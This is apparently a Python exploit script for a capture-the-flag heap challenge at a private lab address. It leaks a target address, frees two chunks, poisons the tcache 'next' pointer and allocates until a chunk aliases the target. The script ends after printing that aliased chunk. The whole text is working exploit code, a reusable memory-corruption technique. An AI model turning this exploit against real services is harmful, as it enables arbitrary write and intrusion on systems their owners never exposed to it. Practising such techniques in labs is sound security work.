import socket, time, re

HOST = "10.13.37.10"
PORT = 21968

class Conn:
    def __init__(self):
        self.s = socket.create_connection((HOST, PORT), timeout=5)
        self.s.settimeout(2)
    def recv(self, t=1.0):
        buf = b""
        end = time.time() + t
        while time.time() < end:
            try:
                chunk = self.s.recv(4096)
                if chunk == b"":
                    break
                buf += chunk
            except socket.timeout:
                break
        return buf
    def cmd(self, data, t=1.0):
        if isinstance(data, str):
            data = data.encode()
        self.s.sendall(data + b"\n")
        return self.recv(t)
    def close(self):
        self.s.close()

def hexdump(s):
    m = re.search(r"raw:([0-9a-f]+)", s)
    return m.group(1) if m else None

c = Conn()
print(c.recv(1.0).decode(errors="replace"))

def new(slot, ln, data):
    c.cmd("1"); c.cmd(str(slot)); c.cmd(str(ln)); return c.cmd(data)
def edit(slot, ln, data):
    c.cmd("2"); c.cmd(str(slot)); c.cmd(str(ln)); return c.cmd(data)
def free(slot):
    c.cmd("3"); return c.cmd(str(slot))
def show(slot):
    c.cmd("4"); return c.cmd(str(slot))
def login():
    return c.cmd("6")

r = new(0, 16, "A"*16); print("new0:", r.decode(errors="replace"))
s0 = show(0).decode(errors="replace")
h0 = hexdump(s0)
target_bytes = bytes.fromhex(h0[64:80])
target_addr = int.from_bytes(target_bytes, "little")
print(f"TARGET = {hex(target_addr)}")

r = new(1, 16, "B"*16); print("new1:", r.decode(errors="replace"))

r = free(0); print("free0:", r.decode(errors="replace"))
r = free(1); print("free1:", r.decode(errors="replace"))

# chunk1 is now tcache head. Poison its 'next' field -> target_addr, key stays whatever (don't care)
r = edit(1, 16, target_bytes + b"\x00"*8)
print("edit1 poison:", r.decode(errors="replace"))

r = new(2, 16, "C"*16)  # pops chunk1 (original), head becomes target_addr
print("new2 (pop chunk1):", r.decode(errors="replace"))

r = new(3, 16, "D"*16)  # pops TARGET_ADDR !
print("new3 (should alias TARGET):", r.decode(errors="replace"))

s3 = show(3).decode(errors="replace")
print("slot3 raw (aliasing TARGET, before overwrite):", s3)

c.close()
